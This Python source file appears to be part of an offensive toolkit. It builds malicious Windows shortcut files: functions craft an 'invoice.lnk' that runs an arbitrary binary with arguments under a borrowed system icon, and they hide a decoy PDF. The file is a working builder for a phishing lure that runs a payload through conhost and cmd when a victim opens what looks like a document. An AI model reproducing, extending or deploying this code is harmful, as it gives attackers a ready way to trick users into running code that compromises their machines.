"""
List of Windows Icons & Their Paths
https://diymediahome.org/windows-icons-reference-list-with-details-locations-images/
"""
import pathlib, pylnk3, os, sys, platform
import stat

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE = AGENT_CODE / "decoys" / "decoy.pdf"

def set_file_hidden(file_path: str):
    """Set a file as hidden (Windows) or with restricted permissions (Linux/Unix)

    Args:
        file_path (str): Path to the file to hide
    """
    try:
        file_path_obj = pathlib.Path(file_path)
        if not file_path_obj.exists():
            print(f"Warning: File does not exist: {file_path}")
            return

        if sys.platform == "win32":
            try:
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)
            except Exception as e:
                print(f"Error setting file as hidden on Windows: {e}")
        else:
            os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
            print(f"File permissions restricted: {file_path}")
    except Exception as e:
        print(f"Error setting file attributes: {e}")

def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, output_filename: str = "invoice.lnk"):
    """Create an LNK trigger file in the payloads directory

    Args:
        target_bin (str): binary to execute a system command with
        args (str): binary arguments
        icon_src (str): DLL source for Windows Icons
        icon_index (int): Index No. of Icon
        description (str): LNK Description
        output_filename (str): Output LNK filename (default: invoice.lnk)

    Returns:
        pathlib.Path: Path to the created LNK file
    """
    lnk_output_path = PAYLOAD_DIR / output_filename

    lnk = pylnk3.for_file(target_bin, lnk_output_path, args, description, icon_src, icon_index)
    lnk.save(str(lnk_output_path))

    return lnk_output_path

def create_payload_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str):
    """Create LNK trigger with conhost + cmd + payload piped to decoy.pdf"""

    lnk_file = create_lnk_trigger(
        target_bin=target_bin,
        args=args,
        icon_src=icon_src,
        icon_index=icon_index,
        description=description
    )

    # Set decoy.pdf as hidden
    set_file_hidden(str(DECOY_FILE))

    return lnk_file
